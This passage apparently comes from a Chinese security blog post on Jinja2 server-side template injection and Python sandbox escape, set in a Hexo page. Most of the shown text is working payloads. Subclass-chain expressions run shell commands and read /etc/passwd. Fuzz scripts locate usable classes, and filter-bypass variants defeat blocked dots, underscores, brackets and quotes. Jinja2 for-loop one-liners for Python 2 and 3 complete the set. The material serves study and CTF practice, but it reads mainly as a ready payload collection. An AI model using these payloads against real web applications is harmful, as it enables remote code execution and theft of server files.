&apos;_frozen_importlib._ImportLockContext&apos;&gt;, &lt;class &apos;_thread._localdummy&apos;&gt;, &lt;class &apos;_thread._local&apos;&gt;, &lt;class &apos;_thread.lock&apos;&gt;, &lt;class &apos;_thread.RLock&apos;&gt;, &lt;class &apos;zipimport.zipimporter&apos;&gt;, &lt;class &apos;_frozen_importlib_external.WindowsRegistryFinder&apos;&gt;, &lt;class &apos;_frozen_importlib_external._LoaderBasics&apos;&gt;, &lt;class &apos;_frozen_importlib_external.FileLoader&apos;&gt;, &lt;class &apos;_frozen_importlib_external._NamespacePath&apos;&gt;, &lt;class &apos;_frozen_importlib_external._NamespaceLoader&apos;&gt;, &lt;class &apos;_frozen_importlib_external.PathFinder&apos;&gt;, &lt;class &apos;_frozen_importlib_external.FileFinder&apos;&gt;, &lt;class &apos;_io._IOBase&apos;&gt;, &lt;class &apos;_io._BytesIOBuffer&apos;&gt;, &lt;class &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;class &apos;posix.ScandirIterator&apos;&gt;, &lt;class &apos;posix.DirEntry&apos;&gt;, &lt;class &apos;codecs.Codec&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;codecs.StreamReaderWriter&apos;&gt;, &lt;class &apos;codecs.StreamRecoder&apos;&gt;, &lt;class &apos;_abc_data&apos;&gt;, &lt;class &apos;abc.ABC&apos;&gt;, &lt;class &apos;dict_itemiterator&apos;&gt;, &lt;class &apos;collections.abc.Hashable&apos;&gt;, &lt;class &apos;collections.abc.Awaitable&apos;&gt;, &lt;class &apos;collections.abc.AsyncIterable&apos;&gt;, &lt;class &apos;async_generator&apos;&gt;, &lt;class &apos;collections.abc.Iterable&apos;&gt;, &lt;class &apos;bytes_iterator&apos;&gt;, &lt;class &apos;bytearray_iterator&apos;&gt;, &lt;class &apos;dict_keyiterator&apos;&gt;, &lt;class &apos;dict_valueiterator&apos;&gt;, &lt;class &apos;list_iterator&apos;&gt;, &lt;class &apos;list_reverseiterator&apos;&gt;, &lt;class &apos;range_iterator&apos;&gt;, &lt;class &apos;set_iterator&apos;&gt;, &lt;class &apos;str_iterator&apos;&gt;, &lt;class &apos;tuple_iterator&apos;&gt;, &lt;class &apos;collections.abc.Sized&apos;&gt;, &lt;class &apos;collections.abc.Container&apos;&gt;, &lt;class &apos;collections.abc.Callable&apos;&gt;, &lt;class &apos;os._wrap_close&apos;&gt;, &lt;class &apos;_sitebuiltins.Quitter&apos;&gt;, &lt;class &apos;_sitebuiltins._Printer&apos;&gt;, &lt;class &apos;_sitebuiltins._Helper&apos;&gt;, &lt;class &apos;types.DynamicClassAttribute&apos;&gt;, &lt;class &apos;types._GeneratorWrapper&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;importlib.abc.Finder&apos;&gt;, &lt;class &apos;importlib.abc.Loader&apos;&gt;, &lt;class &apos;importlib.abc.ResourceReader&apos;&gt;, &lt;class &apos;operator.itemgetter&apos;&gt;, &lt;class &apos;operator.attrgetter&apos;&gt;, &lt;class &apos;operator.methodcaller&apos;&gt;, &lt;class &apos;itertools.accumulate&apos;&gt;, &lt;class &apos;itertools.combinations&apos;&gt;, &lt;class &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;class &apos;itertools.cycle&apos;&gt;, &lt;class &apos;itertools.dropwhile&apos;&gt;, &lt;class &apos;itertools.takewhile&apos;&gt;, &lt;class &apos;itertools.islice&apos;&gt;, &lt;class &apos;itertools.starmap&apos;&gt;, &lt;class &apos;itertools.chain&apos;&gt;, &lt;class &apos;itertools.compress&apos;&gt;, &lt;class &apos;itertools.filterfalse&apos;&gt;, &lt;class &apos;itertools.count&apos;&gt;, &lt;class &apos;itertools.zip_longest&apos;&gt;, &lt;class &apos;itertools.permutations&apos;&gt;, &lt;class &apos;itertools.product&apos;&gt;, &lt;class &apos;itertools.repeat&apos;&gt;, &lt;class &apos;itertools.groupby&apos;&gt;, &lt;class &apos;itertools._grouper&apos;&gt;, &lt;class &apos;itertools._tee&apos;&gt;, &lt;class &apos;itertools._tee_dataobject&apos;&gt;, &lt;class &apos;reprlib.Repr&apos;&gt;, &lt;class &apos;collections.deque&apos;&gt;, &lt;class &apos;_collections._deque_iterator&apos;&gt;, &lt;class &apos;_collections._deque_reverse_iterator&apos;&gt;, &lt;class &apos;collections._Link&apos;&gt;, &lt;class &apos;functools.partial&apos;&gt;, &lt;class &apos;functools._lru_cache_wrapper&apos;&gt;, &lt;class &apos;functools.partialmethod&apos;&gt;, &lt;class &apos;contextlib.ContextDecorator&apos;&gt;, &lt;class &apos;contextlib._GeneratorContextManagerBase&apos;&gt;, &lt;class &apos;contextlib._BaseExitStack&apos;&gt;, &lt;class &apos;rlcompleter.Completer&apos;&gt;]</span><br></pre></td></tr></table></figure>
+
+<p>4、文件读取/命令执行</p>
+<p>3个本地测试成功的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&apos;system&apos;](&apos;ls&apos;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&quot;os&quot;).system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">93</span><br><span class="line">&lt;class &apos;_frozen_importlib_external._NamespaceLoader&apos;&gt;</span><br><span class="line">127</span><br><span class="line">&lt;class &apos;os._wrap_close&apos;&gt;</span><br><span class="line">-1</span><br><span class="line">&lt;class &apos;rlcompleter.Completer&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过观察，其实就是<code>__global__</code>中存在<code>sys</code>或者<code>system</code>或者<code>__builtins__</code>模块</p>
+<p>FUZZ脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">         <span class="keyword">if</span> <span class="string">'system'</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">             print(<span class="string">'system'</span>,num,item)</span><br><span class="line">         <span class="keyword">if</span> <span class="string">'sys'</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">             print(<span class="string">'sys'</span>,num,item)</span><br><span class="line">         <span class="keyword">if</span> <span class="string">'__builtins__'</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">         	 print(<span class="string">'__builtins__'</span>,num,item)</span><br><span class="line">         num+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span></span><br><span class="line">        num+=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>fuzz出很多其他的，测试一下</p>
+<img src="https://i.loli.net/2020/02/24/ynWGKe9NoX7vJrD.png" alt="Snipaste_2020-02-24_15-12-51.png" style="zoom:67%;">
+
+<p>尝试自己构造for循环</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &apos;sys&apos; in c.__init__.__globals__ %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/02/24/4QkOHi6lTNpsA7X.png" alt="Snipaste_2020-02-24_15-33-14.png" style="zoom:67%;">
+
+<p>一个0代表执行一次🤦‍♂️，命令执行的结果无法回显，利用curl带出</p>
+<p>当然也可以指定模块名，就可以只执行一次，比如前面FUZZ出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys 128 &lt;class &apos;_sitebuiltins.Quitter&apos;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意是后半部分<code>Quitter</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Quitter&apos; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>上面三个模块中<code>__builtins__</code>最为丰富</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;, &apos;r&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>比如还有chr()函数</p>
+</blockquote>
+<p>Jinja2的for循环处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Repr&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;Repr&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>eval执行的好处是直接有回显，</p>
+<img src="https://i.loli.net/2020/02/24/v4n2wamzGpJxyct.png" alt="Snipaste_2020-02-24_16-09-37.png" style="zoom:67%;">
+
+
+
+<h3 id="Some-Tricks（测试环境为Py2）"><a href="#Some-Tricks（测试环境为Py2）" class="headerlink" title="Some Tricks（测试环境为Py2）"></a>Some Tricks（测试环境为Py2）</h3><p><strong><code>.</code>被过滤</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>getattr()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[].__class__	=&gt;	getattr([],&apos;__class__&apos;)</span><br><span class="line">[].__class__.__base__	=&gt;	getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[59]	=&gt;	getattr(getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;),&apos;__subclasses__&apos;)()[59]</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__	=&gt;	getattr(getattr(getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;),&apos;__subclasses__&apos;)()[59],&apos;__init__&apos;)</span><br><span class="line">...</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&apos;__class__&apos;),&apos;__base__&apos;),&apos;__subclasses__&apos;)()[59],&apos;__init__&apos;),&apos;__globals__&apos;)[&apos;linecache&apos;],&apos;__dict__&apos;)[&apos;os&apos;],&apos;system&apos;)(&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>_</code>被过滤</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&apos;class&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;base&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;subclasses&apos;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&apos;init&apos;+dir(0)[0][0]*2),dir(0)[0][0]*2+&apos;globals&apos;+dir(0)[0][0]*2)[&apos;linecache&apos;],dir(0)[0][0]*2+&apos;dict&apos;+dir(0)[0][0]*2)[&apos;os&apos;],&apos;system&apos;)(&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>中括号被过滤</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p> 可以用<code>getitem</code>和<code>pop</code>进行绕过过滤 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(58).__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p><strong>引号被过滤</strong></p>
+<p>先获取chr()再将文件名拼接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/02/24/jw7sStYhX534kTa.png" alt="Snipaste_2020-02-24_16-59-07.png" style="zoom:67%;">
+
+<p><strong>过滤双括号))</strong></p>
+<p>利用文件盲注</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/aa&apos;).read()[0:1]==&apos;f&apos; %&#125;~ok~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>写个脚本即可</p>
+<hr>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通用的payload</p>
+<p><strong>基类</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[-1]</span><br><span class="line">().__class__.__base__</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python 2.7</strong></p>
+<p><code>&lt;type &#39;file&#39;&gt;</code></p>
+<blockquote>
+<p>下标一般是40，如果不行的话也可爆破试试</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p><code>os</code>、<code>__builtins__</code>、<code>linecache</code>模块</p>
+<p><code>寻找相应模块.py</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding=utf-8</span><br><span class="line">num = 0</span><br><span class="line">list = [&apos;os&apos;, &apos;__builtins__&apos;, &apos;linecache&apos;]</span><br><span class="line">for item in &apos;&apos;.__class__.__mro__[-1].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">        for i in list:</span><br><span class="line">            if i in item.__init__.__globals__:</span><br><span class="line">                print(i, num, item)</span><br><span class="line">        num += 1</span><br><span class="line">    except:</span><br><span class="line">        print(&apos;-&apos;)</span><br><span class="line">        num += 1</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/02/24/VhvMFANZCy7m9fz.png" alt="Snipaste_2020-02-24_17-24-58.png" style="zoom:67%;">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read()</span><br><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].os.system(&apos;ls&apos;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>这里有很多变形可以参考上面的</p>
+<p>jinja2的for循环一把梭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &apos;&apos;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__==&apos;Quitter&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &apos;&apos;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;linecache&apos;].os.system(&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &apos;&apos;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python 3.7</strong></p>
+<p><code>sys</code>、<code>system</code>、<code>__builtins__</code>模块，其中<code>__builtins__</code>和python2的略有不同</p>
+<p><code>寻找相应模块.py</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding=utf-8</span><br><span class="line">num = 0</span><br><span class="line">list = [&apos;sys&apos;, &apos;__builtins__&apos;, &apos;system&apos;]</span><br><span class="line">for item in &apos;&apos;.__class__.__mro__[-1].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">        for i in list:</span><br><span class="line">            if i in item.__init__.__globals__:</span><br><span class="line">                print(i, num, item)</span><br><span class="line">        num += 1</span><br><span class="line">    except:</span><br><span class="line">        print(&apos;-&apos;)</span><br><span class="line">        num += 1</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/02/24/WAyTklhRX4iYeOa.png" alt="Snipaste_2020-02-24_17-46-26.png" style="zoom:67%;">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read()</span><br><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&apos;system&apos;](&apos;ls&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>jinja2的for循环一把梭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &apos;&apos;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;system&apos;](&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p> <a href="http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/" target="_blank" rel="noopener">http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/</a> </p>
+<p> <a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/#more" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more</a> </p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/SSTI/">SSTI</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/02/23/2020新春战疫-网络安全公益赛-3/">
+        <span class="next-text nav-default">2020新春战疫-网络安全公益赛-3</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
